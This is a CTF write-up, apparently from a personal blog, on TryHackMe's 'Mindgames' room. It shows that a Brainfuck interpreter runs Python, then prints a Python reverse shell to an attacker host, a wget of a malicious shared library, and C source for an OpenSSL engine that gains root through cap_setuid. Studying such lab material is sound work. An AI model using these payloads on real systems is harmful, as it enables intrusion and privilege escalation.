---
layout: post
mermaid: true
title: "Mindgames"
date: 2026-09-11
categories: [ctf, web, privesc]
tags: [brainfuck, rce, capabilities, openssl, golang]
redirect_from: /ctf/web/privesc/2026/09/11/mindgames/
---

## Overview

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Medium |
| **URL** | <a href="https://tryhackme.com/room/mindgames" target="_blank">https://tryhackme.com/room/mindgames</a> |
| **Focus** | Reverse-engineering a "Brainfuck interpreter" that's secretly a Python execution channel, then abusing a stray Linux capability on OpenSSL to jump straight to root |

Mindgames looks like a joke at first — a web page that lets you run Brainfuck in the browser. It's not a joke. The interpreter is a disguise for something much more dangerous, and once you see through it, the rest of the room is a fairly direct shot to root through a Linux capability most people never think to check.

---

## Reconnaissance

```bash
nmap -p- -T4 <TARGET_IP>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

Just two ports. SSH is standard and needs credentials I don't have yet, so port 80 — a Go web server — is the only way in.

---

## An Interpreter That Isn't What It Looks Like

The homepage is a little online Brainfuck playground: a text box, a "run" button, and two canned examples ("Hello, World" and Fibonacci). The frontend is unremarkable:

```js
async function runCode() {
    const programBox = document.querySelector("#code")
    const outBox = document.querySelector("#outputBox")
    outBox.textContent = await (await postData("/api/bf", programBox.value)).text()
}
```

Whatever you type gets POSTed to `/api/bf` and the response comes back as the "output." So far, so normal for a Brainfuck toy.

Here's the twist: it isn't actually interpreting Brainfuck as Brainfuck. Brainfuck's `.` instruction is supposed to print the ASCII character for the current cell value. Instead of printing anything, this backend collects every character `.` would have printed into a buffer — and once the program finishes, it hands that buffer to Python as source code and executes it.

The fastest way to see this is to decode the two "example" programs on the homepage with any Brainfuck-to-text tool. The "Hello, World" example doesn't decode to `Hello, World!` — it decodes to `print("Hello, World!")`. The Fibonacci example decodes to an actual Python function definition. The examples aren't demonstrating Brainfuck output at all; they're demonstrating Python source code that happens to be smuggled in Brainfuck's clothing.

```bash
curl -s -X POST http://<TARGET_IP>/api/bf \
  -H "Content-Type: text/plain" \
  --data-raw '<BRAINFUCK_ENCODING_OF_print(1+1)>'

2
```

Encode `print(1+1)` as Brainfuck, send it, and get `2` back. That's arbitrary Python execution, not Brainfuck output.

Turning Python into Brainfuck by hand isn't fun, so I either used a small script that emits `+`/`-` deltas between consecutive cell values (fast, and produces the `curl` command directly), or fell back to an online encoder like `dcode.fr/brainfuck-language` and pasted the Brainfuck in manually. Same result on the server either way.

---

## Getting a Shell

Once arbitrary Python execution is confirmed, escalating to a shell is routine:

```python
print(__import__("os").popen("ls -la").read())
```

```python
__import__("os").system("""export RHOST="<ATTACKER_IP>";export RPORT=<ATTACKER_PORT>;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""")
```

```bash
nc -lvnp <ATTACKER_PORT>
```

Encode that payload the same way and send it, and a shell lands as `mindgames` (uid=1001). A quick PTY upgrade makes it usable:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo ; fg
export TERM=xterm SHELL=bash
```

---

## Privilege Escalation: A Capability on OpenSSL

```bash
getcap -r / 2>/dev/null

/usr/bin/openssl = cap_setuid+ep
```

Linux capabilities let the kernel grant specific privileges to a binary without making it fully SUID-root. `cap_setuid+ep` on `openssl` means that process — and only that process — can call `setuid()` and have it actually work, even though the account running it isn't root.

OpenSSL happens to support "engines": pluggable `.so` libraries loaded at runtime with the `-engine` flag, originally meant for things like hardware crypto acceleration. Point `-engine` at a library and OpenSSL calls `dlopen()` on it — and the instant that happens, the OS runs any function in that library marked as a constructor, before OpenSSL itself does anything useful. That's the entire attack: get code into a `.so`, have OpenSSL load it, and let the capability do the rest.

```c
// evil.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__((constructor)) initializer(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
x86_64-linux-gnu-gcc -fPIC -shared -o evil.so evil.c
```

I cross-compiled this from an ARM64 host for the x86-64 target, then served it up and pulled it onto the box:

```bash
# attacker
python3 -m http.server 8000

# victim
wget http://<ATTACKER_IP>:8000/evil.so -O /tmp/evil.so
```

```bash
openssl req -engine /tmp/evil.so -new -subj "/"

uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
```

`req` and `-new` are just there so OpenSSL accepts the command and gets as far as loading the engine — the flags after `-engine` don't really matter. The `-p` in `system("/bin/bash -p")` does matter, though: without it, bash notices the effective UID doesn't match the real UID and drops the elevated privileges immediately.

---

## How the Backend Actually Works

Out of curiosity, I pulled the `server` binary and the systemd unit running it:

```
# /etc/systemd/system/server.service
[Service]
User=mindgames
Group=mindgames
WorkingDirectory=/home/mindgames/webserver
ExecStart=/home/mindgames/webserver/server -p 80
Restart=always
RestartSec=5
```

`Restart=always` with a 5-second window means the service comes back on its own if it crashes — worth knowing before trying anything that might kill the process.

```bash
strings server | grep -i python3

/usr/bin/python3
```

The binary doesn't embed a Python interpreter at all — it uses Go's `os/exec` package to spawn `/usr/bin/python3` as an external process for every request and captures combined stdout/stderr to send back as the HTTP response. That's why raw Python tracebacks came through verbatim when a payload had a syntax error. It also explains why `gobuster` never turned up `/api/bf`: the router only 404s on truly unregistered paths, with no distinguishing pattern a dictionary-based fuzzer could latch onto.

---

## Attack Flow

<div class="mermaid">
graph TD
 subgraph RECON["RECON"]
  A["nmap scan<br/>Go server on port 80"]
 end
 
 subgraph ENUM["ENUMERATION"]
  B["Decode Brainfuck examples<br/>reveal Python source"] --> C["Confirm RCE with print(1+1)"]
 end
 
 subgraph EXPL["EXPLOITATION"]
  D["Encode reverse shell payload as Brainfuck"] --> E["Shell as mindgames"]
 end
 
 subgraph PRIVESC["PRIVESC"]
  F["getcap reveals openssl cap_setuid"] --> G["Malicious engine .so with constructor"]
  G --> H["openssl -engine loads library"]
  H --> I["setuid(0) and root shell"]
 end
 
 A --> B
 C --> D
 E --> F
</div>

---

## Key Takeaways

**A "toy" interpreter is a code smell, not a demo.** Any online interpreter for an esoteric language is worth decoding its own example programs — if the "output" is suspiciously well-formed code in a different language, the interpreter is probably a disguised execution channel.

**Capabilities are root, scoped to one binary.** `cap_setuid+ep` on `openssl` isn't a generic system weakness — it's a precise grant that only matters if you can get your own code to run inside that specific process. OpenSSL's engine mechanism is exactly that opening.

**A constructor function runs before you ask it to.** `__attribute__((constructor))` in C fires the moment a shared library is loaded into memory, with no explicit call needed — which is exactly what makes `dlopen()`-based plugin systems (engines, PAM modules, LD_PRELOAD) dangerous when an attacker controls the library path.

---

No flags are discussed here.
